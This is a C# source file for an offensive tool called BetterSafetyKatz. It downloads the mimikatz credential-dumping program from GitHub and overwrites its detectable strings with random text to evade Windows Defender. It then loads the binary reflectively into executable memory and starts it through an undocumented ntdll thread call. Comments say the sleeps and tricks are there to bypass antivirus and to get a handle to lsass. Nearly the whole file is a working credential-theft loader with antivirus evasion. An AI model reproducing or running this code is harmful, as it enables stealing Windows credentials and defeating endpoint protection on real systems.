using System;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.IO;
using System.Security.Principal;
using System.IO.Compression;
using System.Net;
using System.Text.RegularExpressions;
using Internals;
using System.Text;
using System.Linq;
using System.Collections.Generic;
using System.Threading;

namespace BetterSafetyKatz
{
    class Program
    {
        static WebClient webClient = new WebClient();

        public static bool IsHighIntegrity()
        {
            // returns true if the current process is running with adminstrative privs in a high integrity context
            WindowsIdentity identity = WindowsIdentity.GetCurrent();
            WindowsPrincipal principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }

        static void Main(string[] args)
        {
            Console.WriteLine("[+] " + Encoding.UTF8.GetString(Convert.FromBase64String("U3RvbGVuIGZyb20gQGhhcm1qMHksIEBzdWJ0ZWUgYW5kIEBnZW50aWxraXdpLCByZXB1cnBvc2VkIGJ5IEBGbGFuZ3ZpayBhbmQgQE1ydG45")));
            if (!IsHighIntegrity())
            {
                Console.WriteLine("[X] Not in high integrity, unable to grab a handle to lsass!");
            }
            else
            {

                if (!(IntPtr.Size == 8))
                {
                    Console.WriteLine("[X] Process is not 64-bit, this version of katz won't work yo'!");
                    return;
                }

                //TLS / SSL fix for old Net WebClient
                ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;

                //headers needed for the github API to answer back
                webClient.Headers.Set("User-Agent", "request");

                //https://api.github.com/repos/BADWORD/BADWORD/releases/latest
                //Ask the API for the latest releases, should prob be async but lazy
                string latestReleases = webClient.DownloadString(Encoding.UTF8.GetString(Convert.FromBase64String("aHR0cHM6Ly9hcGkuZ2l0aHViLmNvbS9yZXBvcy9nZW50aWxraXdpL21pbWlrYXR6L3JlbGVhc2VzL2xhdGVzdA==")));

                //Regex out the latest url for the zip build of katz
                Regex urlRegex = new Regex(@"https:\/\/github.com\/([a-z\.-]*)\/([a-z\.-]*)\/releases\/download\/([0-9\.-]*)\/([a-z\.-]*)_trunk\.zip", RegexOptions.IgnoreCase);

                //Pull the latest release as a ZIP file
                string latestUrl = urlRegex.Matches(latestReleases)[0].ToString();


                Console.WriteLine("[+] Contacting repo -> " + latestUrl.Split(new string[] { "download/" }, StringSplitOptions.None)[1]);

                //Download that
                byte[] zipStream = webClient.DownloadData(latestUrl);

                MemoryStream catStream = new MemoryStream();

                // unzip.Extract(@"x64/BADWORD.exe", catStream);
                (new Unzip(new MemoryStream(zipStream))).Extract(Encoding.UTF8.GetString(Convert.FromBase64String("eDY0L21pbWlrYXR6LmV4ZQ==")), catStream);

                Console.WriteLine("[+] Randomizing strings in memory");


                //Turn katz into hex
                string hexCats = BitConverter.ToString(catStream.ToArray()).Replace("-", string.Empty);


                //These are Function names from external DLL, they are detected, but luckly katz mainly "works" without them
                // 05.10.2020 -  Turns out we don't need to replace these to get past Defender, so it's excluded to avoid some functions breaking
                /*
                var strinsToReplaceUTF = new string[] {

                    "I_NetServerTrustPasswordsGet",
                    "I_NetServerAuthenticate2",
                    "SamEnumerateUsersInDomain",
                    "SamEnumerateDomainsInSamServer"

               };
               */

                //Stuff that might have signatures, but that we can give random names (Menu stuff)
                var stringsToSlightlyObfuscate = new string[] {
                  "bG9nb25QYXNzd29yZHM=",
                    "Y3JlZG1hbg==",
            };

                //In-code strings that we can give random names
                var stringsToRandomlyObfuscate = new string[] {
               "U2FtUXVlcnlJbmZvcm1hdGlvblVzZXI=",
                "U2FtT3BlblVzZXI=",
                "TGlzdHMgYWxsIGF2YWlsYWJsZSBwcm92aWRlcnMgY3JlZGVudGlhbHM=",
                "U3dpdGNoIChvciByZWluaXQpIHRvIExTQVNTIHByb2Nlc3MgIGNvbnRleHQ=",
                "TGlzdHMgTGl2ZVNTUCBjcmVkZW50aWFscw==",
                "bWltaWthdHo=",
                "TmV0d29ya0NsZWFydGV4dA==",
                "U2VydmljZQ==",
                "UHJveHk=",
                "UGF0aENvbWJpbmU=",
                "QmF0Y2g=",
                "VW5sb2Nr",
                "TmV0d29yaw==",
                "VW5rbm93biAh",
                "SW50ZXJhY3RpdmU=",
                "U2VydmljZQ==",
                "VW5kZWZpbmVkTG9nb25UeXBl",
                "TGlzdCBDcmVkZW50aWFscyBNYW5hZ2Vy",
                "ZHBhcGlzcnYuZGxs",
                "bXVsdGlyZHA=",
                "W2V4cGVyaW1lbnRhbF0gcGF0Y2ggVGVybWluYWwgU2VydmVyIHNlcnZpY2UgdG8gYWxsb3cgbXVsdGlwbGVzIHVzZXJz",
                "RHVtcENyZWRz",
                "bGl2ZXNzcC5kbGw=",
                "d2RpZ2VzdC5kbGw=",
                "a2VyYmVyb3MuZGxs",
                "dGVybXNydi5kbGw=",
                "dGVyRnJvbUFyZ3M=",
                "L3NhbSBvciAvc2lkIHRvIHRhcmdldCB0aGUgYWNjb3VudCBpcyBuZWVkZWQ=",
                "Q0VSVF9OQ1JZUFRfS0VZX1NQRUM=",
                "S2l3aQ==",
                "S2l3aUFuZENNRA==",
                "Q3J5cHRBY3F1aXJlQ2VydGlmaWNhdGVQcml2YXRlS2V5",
                "RVJST1I=",
                "QXJndW1lbnRQdHI=",
                "Q2FsbERsbE1haW5TQzE=",
                "Z2VudGlsa2l3aQ==",
                "QSBMYSBWaWUsIEEgTCdBbW91cg==",
                "dmluY2VudC5sZXRvdXhAZ21haWwuY29t",
                "b2UuZW8=",
                "YmVuamFtaW4=",
                "QmVuamFtaW4gREVMUFk=",
                "aHR0cDovL3BpbmdjYXN0bGUuY29t",
                "aHR0cDovL215c21hcnRsb2dvbi5jb20=",
                "VmluY2VudCBMRSBUT1VY"
                };

              
                //Give random names
                foreach (var sigString in stringsToRandomlyObfuscate.Select(x => Encoding.UTF8.GetString(Convert.FromBase64String(x))))
                {
                    string hexReplace = BitConverter.ToString(Encoding.Unicode.GetBytes(sigString)).Replace("-", string.Empty);

                    string newData = BitConverter.ToString(Encoding.Unicode.GetBytes(Helpers.RandomString(sigString.Length))).Replace("-", string.Empty);

                    hexCats = hexCats.Replace(hexReplace, newData);
                }

                foreach (var menuString in stringsToSlightlyObfuscate.Select(x => Encoding.UTF8.GetString(Convert.FromBase64String(x))))
                {

                    string hexReplace = BitConverter.ToString(Encoding.UTF8.GetBytes(menuString)).Replace("-", string.Empty);

                    char mostUsedChar = Helpers.MostOccurringCharInString(menuString);

                    char replaceChar = Helpers.GetLetter();

                    string newData = BitConverter.ToString(Encoding.UTF8.GetBytes(menuString.Replace(mostUsedChar, replaceChar))).Replace("-", string.Empty);

                    hexCats = hexCats.Replace(hexReplace, newData);
                }

                /*
                foreach (var reffString in strinsToReplaceUTF)
                {
                    string hexReplace = BitConverter.ToString(Encoding.UTF8.GetBytes(reffString)).Replace("-", string.Empty);

                    string newData = BitConverter.ToString(Encoding.UTF8.GetBytes(Helpers.RandomString(reffString.Length))).Replace("-", string.Empty);

                    hexCats = hexCats.Replace(hexReplace, newData);
                }
                */


                // start of @subtee's PE loader
                PELoader pe = new PELoader(Helpers.StringToByteArray(hexCats));
                IntPtr codebase = IntPtr.Zero;
                codebase = WINLib.VirtualAlloc(IntPtr.Zero, pe.OptionalHeader64.SizeOfImage, WINLib.MEM_COMMIT, WINLib.PAGE_EXECUTE_READWRITE);


                // copy Sections
                for (int i = 0; i < pe.FileHeader.NumberOfSections; i++)
                {
                    IntPtr y = WINLib.VirtualAlloc((IntPtr)((long)(codebase.ToInt64() + (int)pe.ImageSectionHeaders[i].VirtualAddress)), pe.ImageSectionHeaders[i].SizeOfRawData, WINLib.MEM_COMMIT, WINLib.PAGE_EXECUTE_READWRITE);
                    Marshal.Copy(pe.RawBytes, (int)pe.ImageSectionHeaders[i].PointerToRawData, y, (int)pe.ImageSectionHeaders[i].SizeOfRawData);
                }

                // perform Base Relocation
                long currentbase = (long)codebase.ToInt64();
                long delta;

                delta = (long)(currentbase - (long)pe.OptionalHeader64.ImageBase);

                // Modify Memory Based On Relocation Table
                IntPtr relocationTable = (IntPtr)((long)(codebase.ToInt64() + (int)pe.OptionalHeader64.BaseRelocationTable.VirtualAddress));
                WINLib.IMAGE_BASE_RELOCATION relocationEntry = new WINLib.IMAGE_BASE_RELOCATION();
                relocationEntry = (WINLib.IMAGE_BASE_RELOCATION)Marshal.PtrToStructure(relocationTable, typeof(WINLib.IMAGE_BASE_RELOCATION));

                int imageSizeOfBaseRelocation = Marshal.SizeOf(typeof(WINLib.IMAGE_BASE_RELOCATION));
                IntPtr nextEntry = relocationTable;
                int sizeofNextBlock = (int)relocationEntry.SizeOfBlock;
                IntPtr offset = relocationTable;

                while (true)
                {
                    WINLib.IMAGE_BASE_RELOCATION relocationNextEntry = new WINLib.IMAGE_BASE_RELOCATION();
                    IntPtr x = (IntPtr)((long)(relocationTable.ToInt64() + (int)sizeofNextBlock));

                    relocationNextEntry = (WINLib.IMAGE_BASE_RELOCATION)Marshal.PtrToStructure(x, typeof(WINLib.IMAGE_BASE_RELOCATION));

                    IntPtr dest = (IntPtr)((long)(codebase.ToInt64() + (int)relocationEntry.VirtualAdress));

                    for (int i = 0; i < (int)((relocationEntry.SizeOfBlock - imageSizeOfBaseRelocation) / 2); i++)
                    {
                        IntPtr patchAddr;
                        UInt16 value = (UInt16)Marshal.ReadInt16(offset, 8 + (2 * i));

                        UInt16 type = (UInt16)(value >> 12);
                        UInt16 fixup = (UInt16)(value & 0xfff);

                        switch (type)
                        {
                            case 0x0:
                                break;
                            case 0xA:
                                patchAddr = (IntPtr)((long)(dest.ToInt64() + (int)fixup));
                                // Add Delta To Location
                                long originalAddr = Marshal.ReadInt64(patchAddr);
                                Marshal.WriteInt64(patchAddr, originalAddr + delta);
                                break;
                        }
                    }

                    offset = (IntPtr)((long)(relocationTable.ToInt64() + (int)sizeofNextBlock));
                    sizeofNextBlock += (int)relocationNextEntry.SizeOfBlock;
                    relocationEntry = relocationNextEntry;

                    nextEntry = (IntPtr)((long)(nextEntry.ToInt64() + (int)sizeofNextBlock));

                    if (relocationNextEntry.SizeOfBlock == 0) break;
                }


                // Resolve Imports
                IntPtr z = (IntPtr)((long)(codebase.ToInt64() + (int)pe.ImageSectionHeaders[1].VirtualAddress));
                IntPtr oa1 = (IntPtr)((long)(codebase.ToInt64() + (int)pe.OptionalHeader64.ImportTable.VirtualAddress));

                int oa2 = Marshal.ReadInt32((IntPtr)((long)(oa1.ToInt64() + (int)16)));

                /*
                 * DLL loaded by katz
                 * ADVAPI32.dll,Cabinet.dll,CRYPT32.dll,cryptdll.dll,DNSAPI.dll,FLTLIB.DLL,NETAPI32.dll,
                 * ole32.dll,OLEAUT32.dll,RPCRT4.dll,SHLWAPI.dll,SAMLIB.dll,Secur32.dll,SHELL32.dll,USER32.dll,
                 * USERENV.dll,VERSION.dll,HID.DLL,SETUPAPI.dll,WinSCard.dll,WINSTA.dll,WLDAP32.dll,advapi32.dll,
                 * msasn1.dll,ntdll.dll,netapi32.dll,KERNEL32.dll,msvcrt.dll
                 * 
                 * 
                 * */
                Console.WriteLine("[+] Mapping DLL Ptrs into memory, but doing it sloooooowly (10 sec tops)");

                for (int j = 0; j < 9999; j++)
                {
                    IntPtr a1 = (IntPtr)((long)(codebase.ToInt64() + (uint)(20 * j) + (uint)pe.OptionalHeader64.ImportTable.VirtualAddress));
                    int entryLength = Marshal.ReadInt32((IntPtr)(((long)a1.ToInt64() + (long)16)));
                    IntPtr a2 = (IntPtr)((long)(codebase.ToInt64() + (int)pe.ImageSectionHeaders[1].VirtualAddress + (entryLength - oa2)));
                    int temp = Marshal.ReadInt32((IntPtr)((long)(a1.ToInt64() + (int)12)));
                    IntPtr dllNamePTR = (IntPtr)((long)(codebase.ToInt64() + temp));
                    string DllName = Marshal.PtrToStringAnsi(dllNamePTR);

                    if (DllName == "") { break; }


                    //Sleep between each DLL re-location
                    Thread.Sleep(10);

                    IntPtr handle = WINLib.LoadLibrary(DllName);

                    for (int k = 1; k < 9999; k++)
                    {
                        IntPtr dllFuncNamePTR = (IntPtr)((long)(codebase.ToInt64() + Marshal.ReadInt32(a2)));

                        string DllFuncName = Marshal.PtrToStringAnsi((IntPtr)((long)(dllFuncNamePTR.ToInt64() + (int)2)));

                        //ForEach function aswell
                        Thread.Sleep(10);

                        IntPtr funcAddy = WINLib.GetProcAddress(handle, DllFuncName);
                        Marshal.WriteInt64(a2, (long)funcAddy);
                        a2 = (IntPtr)((long)(a2.ToInt64() + 8));
                        if (DllFuncName == "") break;

                    }
                }

                Console.WriteLine("[+] Creating thread!");
                IntPtr threadStart = (IntPtr)((long)(codebase.ToInt64() + (int)pe.OptionalHeader64.AddressOfEntryPoint));

                //This is needed for bypass , ¯\_(ツ)_/¯ Defender is weird
                Thread.Sleep(2000);

                //Ripped from https://gist.github.com/TheWover/b2b2e427d3a81659942f4e8b9a978dc3
                IntPtr hThread = WINLib.EtwpCreateEtwThread(threadStart, IntPtr.Zero);

                //Change to create-thread
                WINLib.WaitForSingleObject(hThread, WINLib.INFINITE);

            }
        }
    }

    unsafe class WINLib
    {
        //Values we need
        public static uint MEM_COMMIT = 0x1000;
        public static uint MEM_RESERVE = 0x2000;
        public static uint PAGE_EXECUTE_READWRITE = 0x40;
        public static uint PAGE_READWRITE = 0x04;
        public static uint INFINITE = 0xffffffff;


        //Imports from system dlls
        //Found by TheWover
        //https://gist.github.com/TheWover/b2b2e427d3a81659942f4e8b9a978dc3

        [DllImport("ntdll.dll", ExactSpelling = true, SetLastError = true)]
        public static extern IntPtr EtwpCreateEtwThread(
            IntPtr lpStartAddress,
            IntPtr lpParameter
            );

        [DllImport("kernel32")]
        public static extern IntPtr VirtualAlloc(
            IntPtr lpStartAddr,
            uint size,
            uint flAllocationType,
            uint flProtect
            );

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern IntPtr LoadLibrary(
            string lpFileName
            );

        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        public static extern IntPtr GetProcAddress(
            IntPtr hModule,
            string procName
            );

        [DllImport("kernel32")]
        public static extern UInt32 WaitForSingleObject(

          IntPtr hHandle,
          UInt32 dwMilliseconds
          );

        //Structs
        [StructLayout(LayoutKind.Sequential)]
        public unsafe struct IMAGE_BASE_RELOCATION
        {
            public uint VirtualAdress;
            public uint SizeOfBlock;
        }


        [StructLayout(LayoutKind.Sequential)]
        public unsafe struct IMAGE_IMPORT_DESCRIPTOR
        {
            public uint OriginalFirstThunk;
            public uint TimeDateStamp;
            public uint ForwarderChain;
            public uint Name;
            public uint FirstThunk;
        }
    }
}
